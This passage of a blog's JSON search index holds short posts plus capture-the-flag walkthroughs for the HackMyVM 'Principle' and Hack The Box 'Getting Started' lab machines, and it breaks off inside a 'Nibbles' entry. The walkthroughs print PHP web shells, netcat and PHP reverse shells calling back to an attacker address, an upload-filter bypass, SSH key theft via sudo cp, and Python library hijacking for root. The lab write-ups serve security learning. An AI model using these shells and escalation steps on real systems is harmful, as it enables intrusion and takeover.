menu (on the right corner) &gt; Settings &gt; Privacy and Security (left menu)You can also access this settings typing chrome://settings/adPrivacy in the address bar.Enjoy! ;) You can find how “Ad topics” and “Site-suggested ads” work in more depth, in Google Chrome settings, in the “Learn more” section of each functionality. &#8617; " }, { "title": "Hack The Box Academy - Completed Web Requests", "url": "/posts/htba-web-requests/", "categories": "hack the box, academy", "tags": "hack the box, academy, web requests", "date": "2023-09-10 02:00:01 +0200", "snippet": "Completed Web RequestsCompleted Web Requests achievement", "content": "Completed Web RequestsCompleted Web Requests achievement" }, { "title": "Hack The Box Academy - Completed Introduction to Networking", "url": "/posts/htba-introduction-networking/", "categories": "hack the box, academy", "tags": "hack the box, academy, introduction, networking", "date": "2023-09-10 02:00:01 +0200", "snippet": "Completed Introduction to NetworkingCompleted Introduction to Networking achievement", "content": "Completed Introduction to NetworkingCompleted Introduction to Networking achievement" }, { "title": "Customizing default directory names on GNU/Linux", "url": "/posts/customizing-default-directory-names-gnu-linux/", "categories": "gnu/linux, administration", "tags": "gnu/linux, administration, directories, xdg", "date": "2023-09-02 02:00:01 +0200", "snippet": "Sometimes we don’t like default named directories as “Desktop” or “Downloads” and we prefer lowercase namings as “desktop” or “downloads”, name them in another language, or, simply, give them anoth...", "content": "Sometimes we don’t like default named directories as “Desktop” or “Downloads” and we prefer lowercase namings as “desktop” or “downloads”, name them in another language, or, simply, give them another name.Some applications create default named directories and it’s a pain to have duplicated directories and have to delete them later.Lucky for us, we can change this behavior gobally editing the /etc/xdg/user-dirs.defaults file or locally editing the ~/.config/user-dirs.dirs.As I prefer make the changes globally, I will edit the /etx/xdg/user-dirs.defaults.From manpages.debian.org: The /etc/xdg/user-dirs.defaults file is a text file that contains the default values for the XDG user dirs which are used by the xdg-user-dirs-update command. This file contains lines of the form NAME=VALUE The following names are recognised:DESKTOPDOWNLOADTEMPLATESPUBLICSHAREDOCUMENTSMUSICPICTURESVIDEOS The values are relative pathnames from the home directory and will be translated on a per-path-element basis into the users locale. Lines beginning with a # character are ignored.So, we can edit /etc/xdg/user-dirs.defaults and customize our directories, e.g:# Default settings for user directories## The values are relative pathnames from the home directory and# will be translated on a per-path-element basis into the users localeDESKTOP=desktopDOWNLOAD=downloadsTEMPLATES=templatesPUBLICSHARE=publicDOCUMENTS=documentsMUSIC=musicPICTURES=picturesVIDEOS=videos# Another alternative is:#MUSIC=Documents/Music#PICTURES=Documents/Pictures#VIDEOS=Documents/VideosIf the xdg-user-dirs-update.service is enabled, will keep the directories updated at the beginning of each login session.Enjoy! ;)" }, { "title": "Hack My VM - Principle", "url": "/posts/hmv-principle/", "categories": "hackmyvm, vm", "tags": "hackmyvm, walkthrough, hmv, virtualhost, form abuse, rbash escape, find abuse, cp abuse, sudoers misconfiguration, reverse proxy, chisel, privilege escalation, python library hijacking, principle", "date": "2023-07-28 02:00:01 +0200", "snippet": "HMV PrincipleLastly I’ve been acting (gladly) as beta tester for my friend Kaian.Kaian did the Principle box for HackMyVm and I was one of the chosen to test it.It was a very fun machine and it was...", "content": "HMV PrincipleLastly I’ve been acting (gladly) as beta tester for my friend Kaian.Kaian did the Principle box for HackMyVm and I was one of the chosen to test it.It was a very fun machine and it was a great experience help him to do it.I have to say that there is A LOT of work behind each one of this little machines.Although Principle is an medium level machine (it was meant to be easy), I have to admit that I learned a few things along the way.And, as I completed the box, I have earned the right to write my walkthrough ;)Annotations In this article we are going to assume the following ip addresses: Local machine (attacker, local host): 10.0.0.1 Target machine (victim, Principle box): 10.0.0.2EnumerationWe are going to scan the target machine to find out what services are running:$ nmap -P0 -n -p- -sV -T5 -oA nmap_principle 10.0.0.180/tcp open http nginx 1.22.1We can see that the target has a nginx 1.22.1 server running on port 80.Web footprintingIf we browse to the target we can see the nginx default welcome page:nginx welcome pageDirectory enumerationLet’s see if there are hidden files or directories:$ gobuster dir -u http://10.0.0.2 --wordlist /opt/wordlists/dirb/common.txt/robots.txt (Status: 200) [Size: 68]We can see that there is a robots.txt file.Let’s take a look:User-agent: *Allow: /hi.htmlAllow: /investigateDisallow: /hackmeWe found two new accessible resources: hi.html and /investigate.The hi.html does not throw us anything interesting.If we browse to view-source:http://10.0.0.2/investigate/ we can see a web:/investigateIf we take a look at the source code we can see the following comment:&lt;!-- If you like research, I will try to help you to solve the enigmas, try to search for documents in this directory --&gt;Let’s look for hidden resources in investigate:$ gobuster dir -u http://10.0.0.2/investigate -w /opt/wordlists/dirbuster/directory-list-2.3-medium.txt -b 403,404 -x php,txt,html/index.html (Status: 200) [Size: 812]/rainbow_mystery.txt (Status: 200) [Size: 596]Let’s see what the rainbow_mistery.txt contains:QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBieSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQsIGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1pbmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhlIHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUgdGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4gdGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0gLi4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=We can see that it’s a base64 encoding.If we decoded it we will get the following text:According to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.Maybe that's why I am a robot?Maybe that is why I am alone in this world?The answer is here:-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-We can see that the answer is morse encoded, so let’s decode it:DOMAIN T4L0S.HMVT4L0S.HMV Web footprintingWe have a new domain, so let’s add our new domain to our /etc/hosts/:$ echo \"10.0.0.2 T4L0S.HMV\" | sudo tee -a /etc/hostsIf we browse to t4l0s.hmv we can see a new web:t4l0s.hmvSource codeIf we check the source code we find an interesting comment:&lt;!- Elohim is a liar and you must not listen to him, he is not here but it is possible to find him, you must look somewhere else. -&gt;Directory enumerationLet’s search virtual hosts here:$ gobuster vhost --append-domain -u t4l0s.hmv -r -w /opt/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txtFound: hellfire.t4l0s.hmv Status: 200 [Size: 1659]Ok, we have a new host and we have to add it to our /etc/hosts:$ echo \"10.0.0.2 hellfire.t4l0s.hmv\" | sudo tee -a /etc/hostshellfire.t4l0s.hmv web footprintingIf we browse to our new domain we have a new web.hellfire.t4l0s.hmvSource codeIf we check the source code, the only interesting thing that we found is this comment:&lt;!- You're on the right track, he's getting angry! -&gt;Directory enumerationWe will search for hidden files or directories:$ gobuster dir -u http://hellfire.t4l0s.hmv --wordlist /opt/wordlists/dirb/common.txt -b 403,404 -x php,txt,html/index.php (Status: 200) [Size: 1659]/upload.php (Status: 200) [Size: 748]/output.php (Status: 200) [Size: 1350]/archivos (Status: 301) [Size: 169] [--&gt; http://hellfire.t4l0s.hmv/archivos/]The interesting resource, here, is upload.php.If we browse to http://hellfire.t4l0s.hmv/upload.php we have a web from which we can upload an image.automata photo uploadWe can upload images, so we have to find out if we can exploit this page to gain access to the box.image uploadedWe will try to upload a php file to see if we can do a remote code execution (RCE).We create a new php file with the following content:&lt;?php system('id'); ?&gt;It seems that the web performs checks on the uploaded files and that only images can be uploaded.The file must be an imageLet’s open burp and try to dodge the restrictions.We configure burp as our proxy and intercept the requests.We will modify the upload request, and we will change the Content-Type from application/x-php to image/jpeg:Content-Type: application/x-phpContent-Type: image/jpegOnce our RCE (Remote Code Execution) test is uploaded we can see that we can perform a RCE:$ curl \"http://hellfire.t4l0s.hmv/archivos/rctest.php\" uid=33(www-data) gid=33(www-data) groups=33(www-data)FootholdWe have to take advantage of the RCE to convert it in a remote shell.First we need to start a netcat listener on our host:$ nc -lvnp 1234And, now, we will upload a new php file, but, this time, we will upload a bash one-liner reverse shell:&lt;?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\"); ?&gt;Once our file is uploaded we got shell!We will upgrade our tty:$ script /dev/null -c bashCtrl+Z$ stty raw -echo; fg$ reset$ export TERM=xterm$ export SHELL=bash$ whoamiwww-data$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)As the www-data user is not very useful to us, we need to find a way to pivot to side-pivot to another, more useful, user.We find other users in this machine.$ cat /etc/passwdtalos:x:1000:1000:Talos,,,:/home/talos:/bin/bashsshd:x:101:65534::/run/sshd:/usr/sbin/nologinelohim:x:1001:1001::/home/gehenna:/bin/rbashsml:x:1002:1002::/home/sml:/bin/bash$ ls -la /homedrwxr-xr-x 4 elohim elohim 4096 Jul 14 11:25 gehennadrwxr-xr-x 4 talos talos 4096 Jul 14 07:26 talosWe look for files with suid:$ find / -perm /4000 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/bin/chfn/usr/bin/gpasswd/usr/bin/mount/usr/bin/passwd/usr/bin/sudo/usr/bin/find/usr/bin/su/usr/bin/chsh/usr/bin/umount/usr/bin/newgrpThe find binary seems suspicious:$ ls -la find-rwsr-xr-x 1 talos root 224848 Jan 8 2023 findSo when we use find we are using it as the user talos.We can take advantage of this abusing the binary.If we check /home/talos we find a note:$ ls -la /home/talos-rw-r----- 1 talos talos 320 Jul 13 15:42 note.txtWe abuse find to read note.txt:$ find . -exec cat /home/talos/note.txt \\; -quitCongratulations! You have made it this far thanks to the manipulated file I left you, I knew you would make it!Now we are very close to finding this false God Elohim.I left you a file with the name of one of the 12 Gods of Olympus, out of the eye of Elohim ;)The tool I left you is still your ally. Good luck to you.A few gods (in a couple of languages) later…$ find / -iname *afrodita* 2&gt;/dev/null/etc/selinux/Afrodita.keyLet’s see what Afrodita.key file contais:$ cat /etc/selinux/Afrodita.key Here is my password:xxxxxxxxxxxNow I have done another little trick to help you reach Elohim.REMEMBER: You need the access key and open the door. Anyway, he has a bad memory and that's why he keeps the lock coded and hidden at home.talosNow we can be talos:$ su - talosLet’s see what we can do:talos@Principle:~$ sudo -lMatching Defaults entries for talos on principle: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser talos may run the following commands on principle: (elohim) NOPASSWD: /bin/cpFirst flagNow, we can use /bin/cp as elohim.Let’s see what we can find in /home/gehenna:talos@Principle:~$ ls -la /home/gehenna/total 40drwxr-xr-x 4 elohim elohim 4096 Jul 14 11:25 .drwxr-xr-x 4 root root 4096 Jul 4 06:11 ..-rw------- 1 elohim elohim 289 Jul 14 06:38 .bash_history-rw-r----- 1 elohim elohim 261 Jul 5 08:13 .bash_logout-rw-r----- 1 elohim elohim 3830 Jul 14 06:37 .bashrc-rw-r----- 1 elohim elohim 777 Jul 13 17:19 flag.txtdrw-r----- 3 elohim elohim 4096 Jul 2 20:52 .local-rw-r----- 1 elohim elohim 21 Jul 12 05:35 .lock-rw-r----- 1 elohim elohim 807 Jul 6 06:28 .profiledrwx------ 2 elohim elohim 4096 Jul 6 11:05 .sshWe can get our first flag:talos@principle:/bin$ sudo -u elohim /bin/cp /home/gehenna/flag.txt /dev/stdoutlock seems an interesting file, above all after the hint that talos give us: he keeps the lock coded and hidden at homeSo we print the file content and keep a copy of in our machine:talos@principle$ sudo -u elohim /bin/cp /home/gehenna/.lock /dev/stdoutAnother interesting directory is .ssh.Seems that elohim could connect via ssh using an rsa private key.But, we didn’t find an ssh service exposed…Anyway, we are going to copy the directory content to our /home.We can’t list the files here, but there always the same, so we try a the usual names:$ sudo -u elohim /bin/cp /home/gehenna/.ssh/authorized_keys /dev/stdout$ sudo -u elohim /bin/cp /home/gehenna/.ssh/id_rsa /dev/stdoutAnd we save in our machine the content of these files too.We also can see some interesting information gossiping the .bashrc and .bash_history files.We can see that elohim edited the python subprocess library:nano /usr/lib/python3.11/subprocess.pyAnd we can see that elohim has some aliases defined to restrict a few commands:# GOD aliasesalias cat=\"rbash cat: restricted\"alias vi='rbash: vi: restricted'alias pico='rbash: pico: restricted'alias nano='rbash: nano: restricted'SSHWe have to check if there is a SSH service running without being exposed to the outside.$ systemctl status sshd● ssh.service - OpenBSD Secure Shell server Loaded: loaded (/lib/systemd/system/ssh.service; enabled; preset: enabled) Active: active (running) since Docs: man:sshd(8) man:sshd_config(5) Process: 441 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS) Main PID: 461 (sshd) Tasks: 1 (limit: 202) Memory: 4.6M CPU: 333ms CGroup: /system.slice/ssh.service └─461 \"sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups\"There is a ssh service running. Now we have to find in which port:$ ss -tuneltalos@principle:~/.ssh$ ss -tunelNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:* ino:14407 sk:1 cgroup:/system.slice/ifup@enp0s3.service &lt;-&gt; tcp LISTEN 0 128 0.0.0.0:3445 0.0.0.0:* ino:14524 sk:2 cgroup:/system.slice/ssh.service &lt;-&gt;Ok. There is a SSH service running on port 3445 and not exposed to the outside.As we don’t have permissions to execute ssh, we need to do a reverse proxy tuneling.And, for this, we are going yo use chisel.We need to know the machine architecture to know what chisel binary upload:talos@principle:~/.ssh$ uname -aLinux principle 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/LinuxWe already knew that it was a linux machine, and now, we also know that it has an amd64 architecture, so we need to upload the linux_amd64 binary.We will send the binary from our host to the server using netcat.We start the file transfer on our host:$ nc -lvnp 443 &lt; chisel_1.8.1_linux_amd64And we start receiving the file in the Principle machine:$ cat &gt; chisel &lt; /dev/tcp/10.0.0.1/443We have to give execution permissions to the chisel binary in the Principle machine:$ chmod 700 chiselNow we have to setup the reverse proxy.We will establish the chisel server in our host:$ /chisel_1.8.1_linux_amd64 server --reverse -p 8080And we start the chisel client in the Principle machine:$ ./chisel client 10.0.0.1:8080 R:22222:127.0.0.1:3445So we can connect via ssh using a private key, we need to give it the right permissions:$ chmod 600 elohim_id_rsaTo connect to Principle via our reverse proxy we need to connect to the reverse proxy running on our host:$ ssh elohim@localhost -p22222 -i elohim_id_rsaEnter passphrase for key 'id_rsa':We have to enter a passphrase.Don’t worry, rember the words of talos: he keeps the lock coded and hidden at homeThis is where the .lock file will be useful.The file content is: 7072696e6369706c6573, and we know that is encoded.It’s encoded in hexadecimal, if we decode it we obtain: principles, and this is this passphrase.Now we can connect via ssh to the Principle machine.$ ssh elohim@localhost -p22222 -i elohim_id_rsaEnter passphrase for key 'id_rsa':We are already inside and we are elohimelohimelohim@principle:~$ iduid=1001(elohim) gid=1001(elohim) groups=1001(elohim),1002(sml)Interesting, we are part from the sml group.Let’s see what we can do with sudo:Matching Defaults entries for elohim on principle: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_ptyUser elohim may run the following commands on principle: (root) NOPASSWD: /usr/bin/python3 /opt/reviewer.pyWe can execute the python script /opt/reviewer.py as root, but we are trapped in a rbash shell.So, we need to escape from the rbash.We can escape from the rbash and get a bash shell using php:elohim@principle:~$ php -r '$sock=fsockopen(\"10.0.0.1\",4545);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'To move confortably we will disable the following restricted aliases:$ unalias cat$ unalias viIf we check the reviewer.py script, we can see that we don’t have permissions to write it, but we can read it:elohim@principle:~$ ls -la /opt/-rwxr-xr-x 1 root root 1072 Jul 7 15:17 reviewer.pyAnd we can see that the reviewer.py script file is using the following libraries:import osimport subprocessIf we remember, elohim was writting in the subproces library:nano /usr/lib/python3.11/subprocess.pyLet’s check the library permissions:elohim@principle:~$ ls -la /usr/lib/python3.11/subprocess.py-rw-rw-r-- 1 root sml 85745 Jul 11 19:04 /usr/lib/python3.11/subprocess.pyAs the sml group has write permissions, and we are in the sml group, we can write this library.We can take advantage of this and perform a python library hijacking.Privilege escalation (Python library hijacking)As the python subprocess library is writable, we can spawn a bash shell from there.We will append the following line to the library:os.system('/bin/bash')Now, when we load the library it will open a bash shell.As we can invoke the script that loads the subprocess libary as root, we will get a root shell:$ sudo /usr/bin/python3 /opt/reviewer.pyAnd we can read our last flag!root@principle:/opt# cat /root/flag.txtEnjoy! ;)" }, { "title": "Hack the box - Getting started", "url": "/posts/htb-getting-started/", "categories": "hack the box, machine", "tags": "hack the box, walkthrough, getting started, getsimple, privilege escalation, sudoers misconfiguration", "date": "2023-07-05 02:00:01 +0200", "snippet": "Getting started In this article we are going to assume the folling ip addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Getting started box): 10.0.0.2This will be ...", "content": "Getting started In this article we are going to assume the folling ip addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Getting started box): 10.0.0.2This will be a black-box approach, because we don’t have any information about the target.EnumerationWe are going to scan the tartget machine to find out what services are running:$ nmap -P0 -n -sV --open -oA gettingstarted_initial_scan 10.0.0.2PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))We can see that the target is a GNU/Linux (Ubuntu) host with a SSH server (OpenSSH 8.2p1) running on port 22 and a web service (Apache 2.4.41) running on port 80.Web footprintingIf we browse to the target, we sill se a GetSimple welcome screenWelcome screenThe page doesn’t seem to look to good.If we take a look at the source code we can see a lot of references to http://gettingstarted.htb:http://gettingstarted.htb referencesSo we will fixt it adding 10.0.0.2 as gettingstarted.htb to our /etc/hosts:$ echo \"10.0.0.2 gettingstarted.htb\" | sudo tee -a /etc/hostsIf we reload, the page will look much better:Welcome screen fixedWe can see that we have an instance of a GetSimple blog and we can start to identify the technologies in use.Technologies in use$ whatweb gettingstarted.htbhttp://gettingstarted.htb [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.42.249], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]Directory enumerationLet’s see if there are hidden directories we can check to get more information:$ gobuster dir -u http://gettingstarted.htb --wordlist /usr/share/dirb/wordlists/common.txt===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://gettingstarted.htb[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/dirb/wordlists/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.5[+] Timeout: 10s===============================================================XXXX/XX/XX XX:XX:XX Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 283]/.htaccess (Status: 403) [Size: 283]/.htpasswd (Status: 403) [Size: 283]/admin (Status: 301) [Size: 324] [--&gt; http://gettingstarted.htb/admin/]/backups (Status: 301) [Size: 326] [--&gt; http://gettingstarted.htb/backups/]/data (Status: 301) [Size: 323] [--&gt; http://gettingstarted.htb/data/]/index.php (Status: 200) [Size: 5485]/plugins (Status: 301) [Size: 326] [--&gt; http://gettingstarted.htb/plugins/]/robots.txt (Status: 200) [Size: 32]/server-status (Status: 403) [Size: 283]/sitemap.xml (Status: 200) [Size: 431]/theme (Status: 301) [Size: 324] [--&gt; http://gettingstarted.htb/theme/]We can see a few interesting directories, among which stand out /admin./adminIf we browse to the /admin directory (http://gettingstarted.htb/admin) we will find a login form:Admin login formFoothold/data/users/admin.xmlIf we browse to the /data/users directory (http://gettingstarted.htb/data/users) we will find an admin.xml file with the admin account information:&lt;item&gt;&lt;USR&gt;admin&lt;/USR&gt;&lt;NAME/&gt;&lt;PWD&gt;d033e22ae348aeb5660fc2140aec35850c4da997&lt;/PWD&gt;&lt;EMAIL&gt;admin@gettingstarted.com&lt;/EMAIL&gt;&lt;HTMLEDITOR&gt;1&lt;/HTMLEDITOR&gt;&lt;TIMEZONE/&gt;&lt;LANG&gt;en_US&lt;/LANG&gt;&lt;/item&gt;Here, we have the admin user and hashed pasword.As the password is hashed, we need to try to identify the hash used to get the plaintext password:$ hash-identifier d033e22ae348aeb5660fc2140aec35850c4da997 ...Possible Hashs:[+] SHA-1[+] MySQL5 - SHA-1(SHA-1($pass))Seems that the password is hashed with SHA1.We can use some online SHA1 decrypter and we find that the password is “admin”.We have our admin login credentials (user/password): admin/admin, so we can log in.Once we are logged as admin, in the Supoort section, we can see interesting information about the GetSimple blog and the server setup.Suppor informationNow, we have the GetSimple version used, and we can search exploits for this version:$ searchsploit getsimple --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Getsimple CMS 2.01 - 'changedata.php' Cross-Site Scripting | php/webapps/34789.htmlGetsimple CMS 2.01 - 'components.php' Cross-Site Scripting | php/webapps/34041.txtGetsimple CMS 2.01 - Local File Inclusion | php/webapps/12517.txtGetsimple CMS 2.01 - Multiple Vulnerabilities | php/webapps/14338.htmlGetsimple CMS 2.01 &lt; 2.02 - Administrative Credentials Disclosure | php/webapps/15605.txtGetsimple CMS 2.03 - 'upload-ajax.php' Arbitrary File Upload | php/webapps/35353.txtGetsimple CMS 3.0 - 'set' Local File Inclusion | php/webapps/35726.pyGetsimple CMS 3.1.2 - 'path' Local File Inclusion | php/webapps/37587.txtGetsimple CMS 3.2.1 - Arbitrary File Upload | php/webapps/25405.txtGetSimple CMS 3.3.1 - Cross-Site Scripting | php/webapps/43888.txtGetsimple CMS 3.3.1 - Persistent Cross-Site Scripting | php/webapps/32502.txtGetsimple CMS 3.3.10 - Arbitrary File Upload | php/webapps/40008.txtGetSimple CMS 3.3.13 - Cross-Site Scripting | php/webapps/44408.txtGetSimple CMS 3.3.16 - Persistent Cross-Site Scripting | php/webapps/49726.pyGetSimple CMS 3.3.16 - Persistent Cross-Site Scripting (Authenticated) | php/webapps/48850.txtGetSimple CMS 3.3.4 - Information Disclosure | php/webapps/49928.pyGetSimple CMS Custom JS 0.1 - Cross-Site Request Forgery | php/webapps/49816.pyGetsimple CMS Items Manager Plugin - 'PHP.php' Arbitrary File Upload | php/webapps/37472.phpGetSimple CMS My SMTP Contact Plugin 1.1.1 - Cross-Site Request Forgery | php/webapps/49774.pyGetSimple CMS My SMTP Contact Plugin 1.1.2 - Persistent Cross-Site Scripting | php/webapps/49798.pyGetSimple CMS Plugin Multi User 1.8.2 - Cross-Site Request Forgery (Add Admin) | php/webapps/48745.txtGetSimpleCMS - Unauthenticated Remote Code Execution (Metasploit) | php/remote/46880.rb--------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsWe can see one intersting RCE (Remote Code Execution) for metasploit that could work.Let’s keep this in mind, put aside metasploit, and keep digging a little to try to solve the box without metasploit.Files sectionSeems that we can upload files from the Files section, but does not work.Remote code executionTheme sectionIn the Theme section, under the tab Edit theme, we can edit the template.php file, but we can’t load this page directly.Why? Because the code says so.Let’s see if we can get a command execution here.We will comment or delete all code in template.php and we will edit the file appending the following php code at the beginning:&lt;?php system('id'); ?&gt;PHP code execution testWe save changes and we can curl this file (http://gettingstarted.htb/theme/Innovation/template.php), or browse it, and we see that we have a RCE (remote code execution).$ curl http://gettingstarted.htb/theme/Innovation/template.phpuid=33(www-data) gid=33(www-data) groups=33(www-data)Now we have a RCE (remote code execution) and we need to take advantage of this RCE to convert it in a remote shell.We will edit again the template.php file.But, this time, we will append the following bash one-liner reverse shell to the beginning:&lt;?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f\"); ?&gt;Bash reverse shellWe need to start a netcat listener on our host (the attacker):$ nc -lvnp 1234We have to curl or browse to he template.php file (http://gettingstarted.htb/theme/Innovation/template.php), again, to execute the reverse shell.Now, we have a working reverse shell.$ iduid=33(www-data) gid=33(www-data) groups=33(www-data)If we check the /home directory we will see that the /home/mrb3n is world-readable:$ ls -la /home/total 12drwxr-xr-x 3 root root 4096 Feb 9 2021 .drwxr-xr-x 20 root root 4096 Feb 9 2021 ..drwxr-xr-x 3 mrb3n mrb3n 4096 May 7 2021 mrb3nWe can see that our fist flag (the user.txt) is also world-readable:$ ls -la /home/mrb3ntotal 40drwxr-xr-x 3 mrb3n mrb3n 4096 May 7 2021 .drwxr-xr-x 3 root root 4096 Feb 9 2021 ..lrwxrwxrwx 1 mrb3n mrb3n 9 Feb 9 2021 .bash_history -&gt; /dev/null-rw-r--r-- 1 mrb3n mrb3n 220 Feb 25 2020 .bash_logout-rw-r--r-- 1 mrb3n mrb3n 3771 Feb 25 2020 .bashrcdrwx------ 2 mrb3n mrb3n 4096 Feb 9 2021 .cache-rw-r--r-- 1 mrb3n mrb3n 807 Feb 25 2020 .profile-rw-r--r-- 1 mrb3n mrb3n 0 Feb 9 2021 .sudo_as_admin_successful-rw------- 1 mrb3n mrb3n 10332 May 7 2021 .viminfo-rw-rw-r-- 1 mrb3n mrb3n 33 Feb 16 2021 user.txtSo, we can read our first flag directly:$ cat /home/mrb3n/user.txtPrivilege escalationNow that we have our fist flag, we need to escalate privileges in order to get our second flag, the root.txt.If we check our sudo privileges we will see that we can execute /usr/bin/php as root without password:$ sudo -lMatching Defaults entries for www-data on gettingstarted: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on gettingstarted: (ALL : ALL) NOPASSWD: /usr/bin/phpSince our current directory (/var/www/html/theme/Innovation) is writable, we can create a PHP file with a bash one-liner reverse shell:$ pwd/var/www/html/theme/Innovation$ ls -la /var/www/html/themetotal 16drwxr-xr-x 4 www-data www-data 4096 Feb 9 2021 .drwxr-xr-x 7 www-data www-data 4096 May 7 2021 ..drwxr-xr-x 3 www-data www-data 4096 Sep 7 2018 Cardinaldrwxr-xr-x 4 www-data www-data 4096 Sep 7 2018 Innovation$ echo '&lt;?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1235 &gt;/tmp/f\"); ?&gt;' &gt; reverse_shell.phpNow, we need to start another netcat listener on our host (the attacker):$ nc -lvnp 1235And now, we have to execute our new file with sudo in order to get our root reverse shell:$ sudo /usr/bin/php reverse_shell.phpFinally, we are root and we can get our last flag, the root.txt:# cat /root/root.txtEnjoy! ;)" }, { "title": "Hack the box - Nibbles", "url": "/posts/htb-nibbles/", "categories": "hack the box, machine", "tags": "hack the box, walkthrough, nibbles, nibbleblog, privilege escalation, world-writable file, sudoers misconfiguration, eJPT", "date": "2023-07-03 02:00:01 +0200", "snippet": "Nibbles In this article we are going to assume the following IP addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Nibbles box): 10.0.0.2As this is a retired machin...", "content": "Nibbles In this article we are going to assume the following IP addresses: Local machine (attacker, localhost): 10.0.0.1 Target machine (victim, Nibbles box): 10.0.0.2As this is a retired machine, this will be a grey-box approach, because we have some information about the target.Things we know about the target machine: OS: Linux User path: Web Privilege escalation: World-writable File / Sudoers MisconfigurationFrom this information we can assume that the target machine will be a GNU/Linux host with a running web server with two attack vectors (a world writable file and a misconfigured sudo).EnumerationWe are going to scan the target machine to see if our suspicions are confirmed.$ nmap -P0 -n -sV --open -oA nibbles_inital_scan 10.0.0.2PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWe can see that we were right.The target machine is a GNU/Linux host (Ubuntu), has a web service (Apache 2.4.18) running on port 80 and, moreover, has a ssh service (OpenSSH 7.2p2) running on port 22.Web footprintingIf we open the target in our browser, shows us a simple Hello world! message.But, if we check the page source code, we can see an interesting comment:&lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt;A hidden directory…If we browse to the /nibbleblog directory we will guess that it is a nibble blog. Apart from this, nothing interesting:/nibles_directoryTechnologies in useWe can identify the technologies used with whatweb:http://10.0.0.2/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.0.0.2], RedirectLocation[http://10.0.0.2/nibbleblog/], Title[301 Moved Permanently]http://10.0.0.2/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.0.0.2], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]Directory enumerationAs /nibbleblog is hidden, let’s see if there are more directories hidden.For this we are going to use gobuster:$ gobuster dir -u http://10.0.0.2/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer 